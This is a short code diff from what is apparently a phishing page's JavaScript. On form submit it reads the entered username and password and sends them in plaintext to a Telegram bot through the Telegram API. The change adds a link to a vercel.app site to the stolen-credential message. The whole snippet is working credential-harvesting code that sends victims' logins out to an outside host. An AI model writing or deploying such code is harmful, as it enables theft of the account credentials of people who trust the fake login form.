@@ -16,7 +16,7 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
 
-  const message = `🟢 LOGIN SUCCESS\n👤 Username: ${username}\n🔑 Password: ${password}`;
+  const message = `🟢 LOGIN SUCCESS\n👤 Username: ${username}\n🔑 Password: ${password}\n🔗 URL: https://bunthy-sec.vercel.app`;
   const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
   fetch(url)
